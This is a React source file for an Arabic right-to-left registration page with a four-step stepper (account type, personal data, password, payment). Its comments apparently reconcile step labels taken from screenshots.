import React, { useState } from "react";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { Stepper } from "@/components/Stepper";
import { Step1AccountType } from "@/components/steps/Step1AccountType";
import { Step2PersonalData } from "@/components/steps/Step2PersonalData";
import { Step3Password } from "@/components/steps/Step3Password";
import { Step4Payment } from "@/components/steps/Step4Payment";
import { MessageCircle } from "lucide-react";

export default function Register() {
  const [step, setStep] = useState(4);
  // Labels matching the screenshot:
  // 1: معلومات البطاقة (Card Info - ID Card)
  // 2: استمارة التقديم (Application Form)
  // 3: تفاصيل الدفع (Payment Details - Password setup is usually part of form, but let's map my steps)
  // My Step 3 is Password. The screenshot has "كلمة المرور" (Password) as a header in one image.
  // Actually, looking at the "Password" screenshot, the stepper shows:
  // 4: انتهاء التسجيل (End Registration)
  // 3: كلمة المرور (Password)
  // 2: البيانات الشخصية (Personal Data)
  // 1: نوع الحساب (Account Type)

  // WAIT. The screenshot `...Password_1765369962019.png` shows:
  // 4: انتهاء التسجيل
  // 3: كلمة المرور (Active)
  // 2: البيانات الشخصية
  // 1: نوع الحساب

  // The screenshot `...Summary_1765369962018.png` shows:
  // 4: الدفع الإلكتروني
  // 3: تفاصيل الدفع
  // 2: استمارة التقديم
  // 1: معلومات البطاقة

  // These seem to be two different flows or the screenshot names are confusing.
  // The "Password" screenshot clearly matches the `Step3Password` content I built.
  // So I will stick to the labels from the "Password" screenshot as they match the form fields I saw.

  const steps = [
    "نوع الحساب",
    "البيانات الشخصية",
    "كلمة المرور",
    "انتهاء التسجيل",
  ];

  const nextStep = () => setStep((prev) => Math.min(prev + 1, 4));
  const prevStep = () => setStep((prev) => Math.max(prev - 1, 1));

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
      <Header />

      <Stepper currentStep={step} steps={steps} />

      <main className="flex-1 container mx-auto px-4 pb-12 max-w-3xl">
        <div className="bg-gray-100/50 rounded-lg shadow-sm border border-gray-200 overflow-hidden min-h-[600px]">
          {step === 1 && <Step1AccountType onNext={nextStep} />}
          {step === 2 && (
            <Step2PersonalData onNext={nextStep} onBack={prevStep} />
          )}
          {step === 3 && <Step3Password onNext={nextStep} onBack={prevStep} />}
          {step === 4 && <Step4Payment onNext={nextStep} onBack={prevStep} />}
        </div>
      </main>

      <div className="fixed bottom-6 right-6 z-50">
        <button className="bg-white p-3 rounded-full shadow-lg border border-gray-200 hover:bg-gray-50 text-primary">
          <MessageCircle className="h-8 w-8 fill-primary text-white" />
        </button>
      </div>

      <Footer />
    </div>
  );
}
